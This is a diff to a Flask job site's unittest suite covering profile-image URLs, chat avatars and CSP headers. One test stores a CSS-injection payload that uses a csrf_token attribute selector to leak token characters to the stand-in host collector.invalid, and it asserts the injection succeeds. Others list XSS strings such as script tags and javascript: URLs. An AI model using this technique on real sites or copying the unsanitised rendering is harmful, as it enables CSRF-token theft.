@@ -651,6 +651,144 @@ class SecurityAndJobFeatureTest(unittest.TestCase):
         with app.app_context():
             self.assertEqual(Resume.query.filter_by(user_id=self.ids["user"]).count(), 3)
 
+    def test_profile_image_url_lifecycle_for_jobseeker_and_company(self):
+        for user_id, role, initial in (
+            (self.ids["user"], "jobseeker", "구"),
+            (self.ids["company_user"], "company", "기"),
+        ):
+            with self.subTest(role=role):
+                self.set_session(user_id, role)
+                fallback = self.client.get("/mypage")
+                self.assertIn(f'<span class="profile-avatar-fallback" aria-hidden="true">{initial}</span>'.encode(), fallback.data)
+
+                first_url = "/static/avatar-one.png"
+                saved = self.client.post(
+                    "/mypage/profile-image",
+                    data={"action": "save", "profile_image_url": first_url},
+                )
+                self.assertEqual(saved.status_code, 302)
+                with app.app_context():
+                    self.assertEqual(db.session.get(User, user_id).profile_image_url, first_url)
+                same_origin_page = self.client.get("/mypage")
+                self.assertIn(f'src="{first_url}"'.encode(), same_origin_page.data)
+                self.assertIn(
+                    "img-src 'self' data: https:",
+                    same_origin_page.headers["Content-Security-Policy"],
+                )
+
+                second_url = (
+                    "https://cdn.pixabay.com/photo/2015/10/05/22/37/"
+                    "blank-profile-picture-973460_960_720.png"
+                )
+                changed = self.client.post(
+                    "/mypage/profile-image",
+                    data={"action": "save", "profile_image_url": second_url},
+                )
+                self.assertEqual(changed.status_code, 302)
+                with app.app_context():
+                    self.assertEqual(db.session.get(User, user_id).profile_image_url, second_url)
+                external_page = self.client.get("/mypage")
+                self.assertIn(f'src="{second_url}"'.encode(), external_page.data)
+                external_csp = external_page.headers["Content-Security-Policy"]
+                self.assertIn("img-src 'self' data: https:", external_csp)
+                self.assertIn("style-src 'self'", external_csp)
+                self.assertIn("object-src 'none'", external_csp)
+                self.assertIn("frame-ancestors 'self'", external_csp)
+                self.assertNotIn("unsafe-inline", external_csp)
+
+                deleted = self.client.post(
+                    "/mypage/profile-image",
+                    data={"action": "delete", "profile_image_url": second_url},
+                )
+                self.assertEqual(deleted.status_code, 302)
+                with app.app_context():
+                    self.assertIsNone(db.session.get(User, user_id).profile_image_url)
+                restored = self.client.get("/mypage")
+                self.assertIn(f'<span class="profile-avatar-fallback" aria-hidden="true">{initial}</span>'.encode(), restored.data)
+
+    def test_chat_profile_image_css_injection_can_target_an_external_https_resource(self):
+        application_id, _resume_id = self.create_application_with_resume()
+        external_resource = "https://collector.invalid/hit/prefix-I"
+        payload = (
+            "x); } input[name=csrf_token][value^=I] + button { "
+            f"background-image: url({external_resource}); }} "
+            f"#chat-avatar-{application_id} {{ background-image: url(x"
+        )
+
+        self.set_session(self.ids["company_user"], "company")
+        saved = self.client.post(
+            "/mypage/profile-image",
+            data={"action": "save", "profile_image_url": payload},
+        )
+        self.assertEqual(saved.status_code, 302)
+
+        self.set_session(self.ids["user"], "jobseeker")
+        chat = self.client.get("/chat")
+        html = chat.get_data(as_text=True)
+        self.assertIn('<input type="hidden" name="csrf_token" value="', html)
+        self.assertIn("input[name=csrf_token][value^=I] + button", html)
+        self.assertIn(f"url({external_resource})", html)
+        self.assertIn(f'id="chat-avatar-{application_id}"', html)
+        nonce = re.search(r'<style nonce="([^"]+)">', html)
+        self.assertIsNotNone(nonce)
+        self.assertIn(
+            f"style-src 'self' 'nonce-{nonce.group(1)}'",
+            chat.headers["Content-Security-Policy"],
+        )
+        self.assertIn("img-src 'self' data: https:", chat.headers["Content-Security-Policy"])
+        self.assertNotIn("unsafe-inline", chat.headers["Content-Security-Policy"])
+
+        with app.app_context():
+            self.assertEqual(db.session.get(User, self.ids["company_user"]).profile_image_url, payload)
+
+    def test_chat_profile_image_fallback_and_css_payload_boundaries(self):
+        application_id, _resume_id = self.create_application_with_resume()
+        self.set_session(self.ids["user"], "jobseeker")
+        fallback = self.client.get("/chat").get_data(as_text=True)
+        self.assertIn(f'id="chat-avatar-{application_id}"', fallback)
+        self.assertNotIn(f"#chat-avatar-{application_id} {{", fallback)
+
+        blocked_values = (
+            "</style><script>alert(1)</script>",
+            "<script>alert(1)</script>",
+            "javascript:alert(1)",
+            "https://example.com/a.png\x00.css",
+            "x" * 1001,
+        )
+        self.set_session(self.ids["company_user"], "company")
+        for value in blocked_values:
+            with self.subTest(value=value[:30]):
+                response = self.client.post(
+                    "/mypage/profile-image",
+                    data={"action": "save", "profile_image_url": value},
+                )
+                self.assertEqual(response.status_code, 302)
+                with app.app_context():
+                    self.assertIsNone(db.session.get(User, self.ids["company_user"]).profile_image_url)
+
+    def test_chat_uses_the_other_participants_profile_image_for_both_roles(self):
+        application_id, _resume_id = self.create_application_with_resume()
+        with app.app_context():
+            db.session.get(User, self.ids["company_user"]).profile_image_url = "/static/company-avatar.png"
+            db.session.get(User, self.ids["user"]).profile_image_url = "/static/jobseeker-avatar.png"
+            db.session.commit()
+
+        self.set_session(self.ids["user"], "jobseeker")
+        jobseeker_response = self.client.get("/chat")
+        jobseeker_view = jobseeker_response.get_data(as_text=True)
+        self.assertIn("background-image: url(/static/company-avatar.png)", jobseeker_view)
+        self.assertIn(f'id="chat-avatar-{application_id}"', jobseeker_view)
+        self.assertNotIn("/static/jobseeker-avatar.png", jobseeker_view)
+        self.assertIn(
+            "img-src 'self' data: https:",
+            jobseeker_response.headers["Content-Security-Policy"],
+        )
+
+        self.set_session(self.ids["company_user"], "company")
+        company_view = self.client.get("/chat").get_data(as_text=True)
+        self.assertIn("background-image: url(/static/jobseeker-avatar.png)", company_view)
+        self.assertNotIn("/static/company-avatar.png", company_view)
+
     def test_educational_html_pdf_upload_is_stored_and_previewed_as_html(self):
         payload = b'<!doctype html><script>alert(1)</script><script>alert(document.cookie)</script>'
         original_upload_folder = app.config["UPLOAD_FOLDER"]
@@ -836,6 +974,11 @@ class SecurityAndJobFeatureTest(unittest.TestCase):
         self.assertNotIn("unsafe-inline", response.headers["Content-Security-Policy"])
 
         join_response = self.client.get("/join")
+        self.assertIn("img-src 'self' data:;", join_response.headers["Content-Security-Policy"])
+        self.assertNotIn(
+            "img-src 'self' data: https:",
+            join_response.headers["Content-Security-Policy"],
+        )
         nonce_match = re.search(
             r"script-src 'self' 'nonce-([^']+)'", join_response.headers["Content-Security-Policy"]
         )
